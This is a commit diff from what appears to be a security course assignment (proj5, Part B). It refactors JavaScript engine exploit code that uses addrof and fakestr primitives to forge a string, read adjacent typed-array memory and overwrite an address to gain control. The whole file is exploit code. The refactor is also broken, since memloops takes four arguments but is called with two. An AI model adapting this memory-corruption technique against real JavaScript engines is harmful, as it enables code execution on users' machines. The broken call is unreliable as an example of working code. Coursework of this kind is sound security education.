5639172b4e306dccdac7615f0f553305270a1f4b
WilliamGrossKC <wgross769@gmail.com>
2022-04-09 23:48:11 -0500

    Update partb.js

--- proj5/partb.js
+++ proj5/partb.js
@@ -1,9 +1,34 @@
 /*
  * TODO: Part B solution goes here!
  */
+
 let data = new Uint32Array(1);
 let strfront = String.fromCharCode(1, 0, 0, 0, 0, 50, 200, 3, 0, 0, 0, 0, 0, 0, 0, 0);
 let fakestring = cs361s.fakestr(cs361s.addrof(strfront) + 16);
+
+let memloops = function(copy, fakestring, offset, data) {
+    // Loop for each index
+    var index = 0;
+    while(index < copy.length){
+        copy[index] = fakestring.charCodeAt(offset + index);
+        index++;
+    }
+
+
+    // Loop transfering data to copy
+    var fb = 0;
+    while(fb < 8) {
+        var bit = 0;
+        let temp = cs361s.addrof(data);
+        while(bit < fb) {
+            temp = (temp - copy[72 - 16 + bit])/256;
+            bit++;
+        }   
+        copy[72 - 16 + fb] = temp % 256;
+        fb++;
+    }
+};
+
 
 // Here we are creating arrays for each condition where the address of the string is before of after the array
 let originarray = new Uint32Array(72);
@@ -14,26 +39,7 @@ while (cs361s.addrof(originarray) > cs361s.addrof(fakestring) + 10000000 || cs36
 // Create offet and our copying array
 let offset = cs361s.addrof(originarray) - (cs361s.addrof(fakestring) + 16);
 let copy = new Uint8Array(72);
-
-// Loop for each index
-var index = 0;
-while(index < copy.length){
-    copy[index] = fakestring.charCodeAt(offset + index);
-    index++;
-}
-
-// Loop transfering data to copy
-var fb = 0;
-while(fb < 8) {
-    var bit = 0;
-    let temp = cs361s.addrof(data);
-    while(bit < fb) {
-        temp = (temp - copy[72 - 16 + bit])/256;
-        bit++;
-    }   
-    copy[72 - 16 + fb] = temp % 256;
-    fb++;
-}
+memloops(copy, offset);
 
 // pass to control
 let cc = String.fromCharCode(...copy)
